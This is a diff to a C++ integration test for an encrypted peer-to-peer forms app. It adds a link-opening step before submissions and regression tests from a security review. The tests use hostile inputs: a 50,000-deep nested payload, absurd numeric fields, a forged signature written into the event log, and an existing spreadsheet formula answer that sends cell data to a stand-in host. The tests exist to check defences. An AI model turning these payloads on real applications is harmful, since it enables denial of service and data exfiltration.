@@ -88,6 +88,12 @@ static json formOf(Peer& p, const std::string& fid) {
     json forms = p.snap()["state"]["forms"];
     return forms.is_object() && forms.contains(fid) && forms[fid].is_object() ? forms[fid] : json::object();
 }
+// A respondent opens the creator's link before answering (open-review 2026-10-30, FR-3: answers go
+// only to a creator a link names): pin the creator this peer sees for the form.
+static void openLink(Peer& p, const std::string& fid) {
+    const std::string c = formOf(p, fid).value("creator", "");
+    if (!c.empty()) p.call(p.core->importForm("whisperbox://form?id=" + fid + "&by=" + c));
+}
 static json responsesOf(Peer& p, const std::string& fid) {
     json s = p.snap();
     if (s["creatorView"].is_null() || !s["creatorView"]["responses"].contains(fid)) return json::array();
@@ -134,8 +140,10 @@ int main(int argc, char** argv) {
     json answers = json::array({{{"questionId", "q1"}, {"value", 1}},
                                 {{"questionId", "q2"}, {"value", json::array({0})}},
                                 {{"questionId", "q3"}, {"value", "no olives, please"}}});
+    openLink(*B, fid);
     json sr = B->call(B->core->submitResponse(fid, answers.dump()));
     CHECK(sr.value("ok", false), "B submitResponse ok");
+    openLink(*B, fid);
     json sr2 = B->call(B->core->submitResponse(fid, answers.dump()));
     CHECK(!sr2.value("ok", true), "B second submit rejected locally (one response per respondent)");
     CHECK(waitUntil([&] { return responsesOf(*A, fid).size() == 1; }, 3000), "A decrypts exactly one response");
@@ -173,6 +181,7 @@ int main(int argc, char** argv) {
         std::string fxid = fx.value("formId", "");
         CHECK(waitUntil([&] { return hasForm(*C, fxid); }, 3000), "CSV form reaches C");
         json ans = json::array({{{"questionId", "t"}, {"value", "=HYPERLINK(\"https://example.invalid/?\"&A1,\"x\")"}}, {{"questionId", "n"}, {"value", -5}}});
+        openLink(*C, fxid);
         CHECK(C->call(C->core->submitResponse(fxid, ans.dump())).value("ok", false), "C answers with a formula");
         CHECK(waitUntil([&] { return responsesOf(*A, fxid).size() == 1; }, 3000), "A decrypts C's formula answer");
         std::string cx = A->call(A->core->exportCsv(fxid)).value("csv", "");
@@ -210,7 +219,9 @@ int main(int argc, char** argv) {
     std::string wfid = A->call(A->core->createForm(wdef.dump())).value("formId", "");
     CHECK(waitUntil([&] { return hasForm(*B, wfid) && hasForm(*C, wfid); }, 3000), "whitelisted form syncs");
     json one = json::array({{{"questionId", "q1"}, {"value", "yo"}}});
+    openLink(*B, wfid);
     CHECK(B->call(B->core->submitResponse(wfid, one.dump())).value("ok", false), "whitelisted B submits");
+    openLink(*C, wfid);
     json cTry = C->call(C->core->submitResponse(wfid, one.dump()));
     CHECK(!cTry.value("ok", true), "non-whitelisted C is refused locally");
     pump(800);
@@ -271,6 +282,7 @@ int main(int argc, char** argv) {
     CHECK(!B->call(B->core->closeForm(fid)).value("ok", true), "non-creator cannot close");
     CHECK(A->call(A->core->closeForm(fid)).value("ok", false), "creator closes");
     CHECK(waitUntil([&] { return formOf(*C, fid).value("status", "") == "closed"; }, 3000), "close propagates");
+    openLink(*C, fid);
     CHECK(!C->call(C->core->submitResponse(fid, answers.dump())).value("ok", true), "submit to closed form refused");
     CHECK(responsesOf(*A, fid).size() == 1, "closed form keeps its pre-close response");
 
@@ -513,10 +525,13 @@ int main(int argc, char** argv) {
         std::string cf = cr.value("formId", "");
         CHECK(waitUntil([&] { return hasForm(*B, cf) && hasForm(*C, cf) && hasForm(*G, cf); }, 3000), "capped form syncs");
         CHECK(formOf(*B, cf).value("maxResponses", 0) == 2 && formOf(*B, cf).value("showResponseCount", false), "cap + show-count travel with the form");
+        openLink(*B, cf);
         CHECK(B->call(B->core->submitResponse(cf, json::array({{{"questionId", "q1"}, {"value", true}}}).dump())).value("ok", false), "B answers yes (boolean)");
+        openLink(*C, cf);
         CHECK(C->call(C->core->submitResponse(cf, json::array({{{"questionId", "q1"}, {"value", false}}}).dump())).value("ok", false), "C answers no (false is a real answer)");
         CHECK(waitUntil([&] { return responsesOf(*A, cf).size() == 2; }, 3000), "creator decrypts both");
         CHECK(waitUntil([&] { return formOf(*G, cf).value("status", "") == "closed"; }, 9000), "form auto-closes at its answer cap and peers see it");
+        openLink(*G, cf);
         CHECK(!G->call(G->core->submitResponse(cf, json::array({{{"questionId", "q1"}, {"value", true}}}).dump())).value("ok", true), "a third answer is refused once closed");
         std::string csv = A->call(A->core->exportCsv(cf)).value("csv", "");
         CHECK(csv.find(",Yes") != std::string::npos && csv.find(",No") != std::string::npos, "CSV renders yes/no");
@@ -535,16 +550,19 @@ int main(int argc, char** argv) {
         std::string ef = A->call(A->core->createForm(json({{"title", "Editable"}, {"questions", qs}, {"allowEdits", true}}).dump())).value("formId", "");
         CHECK(waitUntil([&] { return hasForm(*B, ef); }, 3000), "editable form syncs");
         CHECK(formOf(*B, ef).value("allowEdits", false) && formOf(*B, ef).value("editWindowMinutes", 0) == 15, "allowEdits + 15-minute window travel with the form");
+        openLink(*B, ef);
         CHECK(B->call(B->core->submitResponse(ef, json::array({{{"questionId", "q1"}, {"value", true}}}).dump())).value("ok", false), "B answers yes");
         CHECK(formOf(*B, ef).value("canEdit", false), "B may still edit");
         dumpFixture(*B, "editable");   // respondent within the edit window
         CHECK(waitUntil([&] { return responsesOf(*A, ef).size() == 1; }, 3000), "creator has B's answer");
+        openLink(*B, ef);
         CHECK(B->call(B->core->submitResponse(ef, json::array({{{"questionId", "q1"}, {"value", false}}}).dump())).value("ok", false), "B edits to no");
         CHECK(waitUntil([&] { auto r = responsesOf(*A, ef); return r.size() == 1 && r[0]["answers"][0]["value"] == false && r[0].value("edits", 0) == 1; }, 3000),
               "creator sees ONE response, edited, with the new answer");
         CHECK(A->call(A->core->confirmResponse(ef, addrB)).value("ok", false), "creator sends the receipt");
         CHECK(waitUntil([&] { return formOf(*B, ef).value("myConfirmed", false); }, 3000), "B gets the receipt");
         CHECK(!formOf(*B, ef).value("canEdit", true), "after the receipt B can no longer edit");
+        openLink(*B, ef);
         json late = B->call(B->core->submitResponse(ef, json::array({{{"questionId", "q1"}, {"value", true}}}).dump()));
         CHECK(!late.value("ok", true) && late.value("error", "").find("receipt") != std::string::npos, "an edit after the receipt is refused");
 
@@ -556,9 +574,11 @@ int main(int argc, char** argv) {
             CHECK(waitUntil([&] { return formOf(*G, ef).value("title", "") == "Editable v2" && formOf(*G, ef).value("version", 0) == 2; }, 3000), "peers see the new version");
             CHECK(formOf(*G, ef)["questions"].size() == 2, "with the added question");
             CHECK(!G->call(G->core->updateForm(ef, json({{"title", "hijack"}}).dump())).value("ok", true), "a non-creator can't update");
+            openLink(*G, ef);
             CHECK(G->call(G->core->submitResponse(ef, json::array({{{"questionId", "q1"}, {"value", true}}, {{"questionId", "q2"}, {"value", 3}}}).dump())).value("ok", false), "G answers the updated form");
             CHECK(waitUntil([&] { for (auto& r : responsesOf(*A, ef)) if (r["respondent"] == G->snap()["identity"]["address"] && r["answers"].size() == 2) return true; return false; }, 3000),
                   "creator gets the answer to the new question");
+            openLink(*G, ef);
             json bad = G->call(G->core->submitResponse(ef, json::array({{{"questionId", "q1"}, {"value", true}}, {{"questionId", "q2"}, {"value", 9}}}).dump()));
             CHECK(!bad.value("ok", true), "updated validation applies (9 > max 5)");
         }
@@ -569,6 +589,7 @@ int main(int argc, char** argv) {
                   "anonymous + members-only is refused");
             std::string an = A->call(A->core->createForm(json({{"title", "Anonymous"}, {"anonymous", true}, {"questions", qs}}).dump())).value("formId", "");
             CHECK(waitUntil([&] { return hasForm(*B, an); }, 3000) && formOf(*B, an).value("anonymous", false), "anonymous flag travels with the form");
+            openLink(*B, an);
             CHECK(B->call(B->core->submitResponse(an, json::array({{{"questionId", "q1"}, {"value", true}}}).dump())).value("ok", false), "B answers the anonymous form");
             CHECK(waitUntil([&] { return responsesOf(*A, an).size() == 1; }, 3000), "creator decrypts it");
             std::string who = responsesOf(*A, an)[0].value("respondent", "");
@@ -576,6 +597,7 @@ int main(int argc, char** argv) {
             std::ifstream bf(B->dir + "/identity.json"); json bj = json::parse(bf);
             whisperbox::SignId bid = whisperbox::identityFromPriv(whisperbox::fromHex(bj["privHex"].get<std::string>()));
             CHECK(who == whisperbox::deriveAnonIdentity(bid, an).address, "it is B's derived anonymous identity for THIS form");
+            openLink(*B, an);
             CHECK(!B->call(B->core->submitResponse(an, json::array({{{"questionId", "q1"}, {"value", false}}}).dump())).value("ok", true), "still one answer per person");
             CHECK(A->call(A->core->confirmResponse(an, who)).value("ok", false) && waitUntil([&] { return formOf(*B, an).value("myConfirmed", false); }, 3000), "receipts still reach B");
             std::ifstream evf(B->dir + "/events.json"); json evs = json::parse(evf);
@@ -588,6 +610,7 @@ int main(int argc, char** argv) {
         {
             std::string sf = A->call(A->core->createForm(json({{"title", "Shared"}, {"questions", qs}}).dump())).value("formId", "");
             CHECK(waitUntil([&] { return hasForm(*B, sf) && hasForm(*G, sf); }, 3000), "shared form syncs");
+            openLink(*B, sf);
             CHECK(B->call(B->core->submitResponse(sf, json::array({{{"questionId", "q1"}, {"value", true}}}).dump())).value("ok", false), "B answers");
             const std::string gCode = G->snap()["identity"]["pubHex"];
             CHECK(!A->call(A->core->addCoOwner(sf, "02abc")).value("ok", true), "a malformed co-owner code is refused");
@@ -613,7 +636,9 @@ int main(int argc, char** argv) {
             CHECK(formOf(*C, qf)["quizKey"].is_string() && formOf(*C, qf).dump().find("Praha\"},\"q") == std::string::npos
                   && !formOf(*C, qf).contains("quiz"), "the answer key travels sealed (others see only quizKey)");
             CHECK(formOf(*A, qf)["quiz"]["q2"].value("points", 0) == 2, "creator opens its answer key");
+            openLink(*B, qf);
             CHECK(B->call(B->core->submitResponse(qf, json::array({{{"questionId", "q1"}, {"value", true}}, {{"questionId", "q2"}, {"value", 0}}}).dump())).value("ok", false), "B answers (1 of 2 right)");
+            openLink(*C, qf);
             CHECK(C->call(C->core->submitResponse(qf, json::array({{{"questionId", "q1"}, {"value", true}}, {{"questionId", "q2"}, {"value", 1}}}).dump())).value("ok", false), "C answers (both right)");
             CHECK(waitUntil([&] { return responsesOf(*A, qf).size() == 2; }, 4000), "A gets both answers");
             std::string cidB, cidC;
@@ -647,6 +672,7 @@ int main(int argc, char** argv) {
         CHECK(A->call(A->core->reopenForm(rf)).value("ok", false), "reopenForm ok");
         CHECK(waitUntil([&] { return formOf(*G, rf).value("status", "") == "open"; }, 3000), "peers see it open again");
         CHECK(A->call(A->core->setAutoReceipts(rf, "1")).value("ok", false), "automatic receipts on");
+        openLink(*G, rf);
         CHECK(G->call(G->core->submitResponse(rf, json::array({{{"questionId", "q1"}, {"value", true}}}).dump())).value("ok", false), "G answers after the re-open");
         CHECK(waitUntil([&] { return responsesOf(*A, rf).size() == 1; }, 3000), "the post-re-open answer counts");
         CHECK(waitUntil([&] { return formOf(*G, rf).value("myConfirmed", false); }, 9000), "automatic receipt reaches G without a click");
@@ -678,6 +704,7 @@ int main(int argc, char** argv) {
         G->stop(); G->start();
         CHECK(formOf(*G, af).contains("answerDraft") && formOf(*G, af)["answerDraft"][0]["value"] == true, "a half-filled answer survives a restart");
         dumpFixture(*G, "answer-draft");   // respondent with unsent (restored) answers on a yes/no form
+        openLink(*G, af);
         CHECK(G->call(G->core->submitResponse(af, json::array({{{"questionId", "q1"}, {"value", true}}}).dump())).value("ok", false) && !formOf(*G, af).contains("answerDraft"), "submitting clears the answer draft");
     }
 
@@ -837,6 +864,7 @@ int main(int argc, char** argv) {
                        {"dev", "wb-x"}, {"payload", {{"encryptedPayload", sealedHex}}}};
             send(json({{"v", 1}, {"type", "EVENT"}, {"event", ev}}).dump());
             pump(300);
+            openLink(*B, fzid);
             CHECK(B->call(B->core->submitResponse(fzid, json::array({{{"questionId", "q"}, {"value", "real"}}}).dump())).value("ok", false), "B answers for real");
             auto verifiedOf = [&](bool v) { json out = json::array(); for (const auto& r : responsesOf(*A, fzid)) if (r.value("verified", true) == v) out.push_back(r); return out; };
             CHECK(waitUntil([&] { auto r = verifiedOf(true); return r.size() == 1 && r[0]["answers"][0].value("value", "") == "real"; }, 3000),
@@ -936,6 +964,60 @@ int main(int argc, char** argv) {
             }
             A->start(); pump(200);
             CHECK(formOf(*A, ff).value("status", "") == "open" && diag(*A, "loadDropped") >= 1, "an unsigned close in events.json is dropped at load, the form stays open (FR-7)");
+        }
+        // ── open-review 2026-10-30 (0.5.1 re-review: FR-1, 2, 3, 5, 6) ──
+        {
+            CHECK(waitUntil([&] { return A->snap().value("nodeReady", false); }, 5000), "A is back on the topic (2)");
+            pump(500);
+            const long long now = (long long)QDateTime::currentMSecsSinceEpoch();
+            json g = A->call(A->core->createForm(json({{"title", "deep target"}, {"questions", json::array({{{"id", "q"}, {"type", "shortText"}, {"text", "x"}}})}}).dump()));
+            const std::string gid = g.value("formId", "");
+            const std::string gpub = formOf(*A, gid).value("publicKey", "");
+            // FR-1: an answer sealed to the form's public key with 50,000 nested arrays inside (no signature)
+            std::string deep(50000, '['); deep += std::string(50000, ']');
+            const std::string pt = R"({"formId":")" + gid + R"(","respondent":"0x)" + std::string(40, '9') + R"(","answers":[],"signature":null,"x":)" + deep + "}";
+            const std::string sealedHex = whisperbox::toHex(whisperbox::eciesSeal(whisperbox::fromHex(gpub), whisperbox::Bytes(pt.begin(), pt.end())));
+            json de = {{"v", 1}, {"id", whisperbox::responseSubmitId(sealedHex)}, {"type", "response.submit"}, {"hlc", {{"wall", now}, {"ctr", 0}, {"dev", "x"}}}, {"dev", "x"}, {"payload", {{"encryptedPayload", sealedHex}}}};
+            send(json({{"v", 1}, {"type", "EVENT"}, {"event", de}}).dump()); pump(500);
+            CHECK(A->snap()["identity"]["address"] == addrA && A->call(A->core->getDecryptedResponses(gid)).is_object(), "a sealed answer nested 50,000 deep doesn't crash the creator (FR-1)");
+            CHECK(responsesOf(*A, gid).empty(), "...and isn't listed");
+            // FR-2: a signed form with maxResponses 1e300 is refused at admission
+            whisperbox::SignId y = whisperbox::identityFromPriv(whisperbox::sha256(whisperbox::Bytes{'f', 'r', '2'}));
+            json yp = {{"id", "fr2-huge"}, {"creator", y.address}, {"publicKey", y.pubHex}, {"title", "huge"}, {"questions", json::array()},
+                       {"whitelist", {{"type", "none"}, {"value", ""}}}, {"createdAt", now}, {"maxResponses", 1e300}, {"editWindowMinutes", 9.2e18}};
+            json ye = {{"v", 1}, {"id", "form:fr2-huge"}, {"type", "form.publish"}, {"hlc", {{"wall", now}, {"ctr", 0}, {"dev", "y"}}}, {"dev", "y"}, {"payload", yp}};
+            whisperbox::signEventJson(ye, y);
+            send(json({{"v", 1}, {"type", "EVENT"}, {"event", ye}}).dump()); pump(300);
+            CHECK(!A->snap()["state"]["forms"].contains("fr2-huge"), "a form with maxResponses 1e300 is refused (FR-2)");
+            // FR-2: an answer claiming submittedAt LLONG_MIN, with a network time, is handled
+            const std::string pt2 = R"({"formId":")" + gid + R"(","respondent":"0x)" + std::string(40, '8') + R"(","submittedAt":-9223372036854775808,"answers":[],"signature":null})";
+            const std::string s2 = whisperbox::toHex(whisperbox::eciesSeal(whisperbox::fromHex(gpub), whisperbox::Bytes(pt2.begin(), pt2.end())));
+            json e2 = {{"v", 1}, {"id", whisperbox::responseSubmitId(s2)}, {"type", "response.submit"}, {"hlc", {{"wall", now}, {"ctr", 0}, {"dev", "x"}}}, {"dev", "x"}, {"payload", {{"encryptedPayload", s2}}}};
+            FakeBus::get().tsNs = now * 1000000LL;
+            send(json({{"v", 1}, {"type", "EVENT"}, {"event", e2}}).dump()); pump(300);
+            FakeBus::get().tsNs = 0;
+            CHECK(A->call(A->core->exportCsv(gid)).value("ok", false), "an answer with submittedAt LLONG_MIN doesn't break the view or the CSV (FR-2)");
+            // FR-3: a bare id is enough to see a form, not to answer it
+            json bare = B->call(B->core->joinForm(gid));
+            CHECK(bare.value("ok", false) && waitUntil([&] { return hasForm(*B, gid); }, 3000), "B opens the form by bare id");
+            CHECK(formOf(*B, gid).value("needsLink", false) && !formOf(*B, gid).value("canRespond", true), "...it needs the creator's link to answer (FR-3)");
+            CHECK(!B->call(B->core->submitResponse(gid, json::array({{{"questionId", "q"}, {"value", "x"}}}).dump())).value("ok", true), "...and a bare-id answer is refused");
+            openLink(*B, gid);
+            CHECK(formOf(*B, gid).value("canRespond", false), "with the creator's link, B can answer");
+            // FR-5: a local form peers would refuse isn't created
+            json longQ = json::array(); for (int i = 0; i < 400; i++) longQ.push_back({{"id", "q" + std::to_string(i)}, {"type", "textarea"}, {"text", std::string(2000, 'x')}});
+            CHECK(!A->call(A->core->createForm(json({{"title", "too big"}, {"questions", longQ}}).dump())).value("ok", true), "a form over the event size cap is refused locally (FR-5)");
+            // FR-6: a form.publish with a forged signature in events.json is dropped at load
+            A->stop();
+            {
+                std::ifstream in(A->dir + "/events.json"); json log = json::parse(in);
+                json forged = yp; forged["id"] = "fr6-forged"; forged["maxResponses"] = 5; forged["editWindowMinutes"] = 15; forged["creator"] = addrA;
+                log.push_back({{"v", 1}, {"id", "form:fr6-forged"}, {"type", "form.publish"}, {"hlc", {{"wall", now}, {"ctr", 0}, {"dev", "y"}}}, {"dev", "y"},
+                               {"payload", forged}, {"pub", y.pubHex}, {"sig", std::string(128, '1')}});
+                std::ofstream(A->dir + "/events.json", std::ios::trunc) << log.dump();
+            }
+            A->start(); pump(200);
+            CHECK(!A->snap()["state"]["forms"].contains("fr6-forged"), "a form.publish with a forged signature in events.json is dropped at load (FR-6)");
         }
     }
 
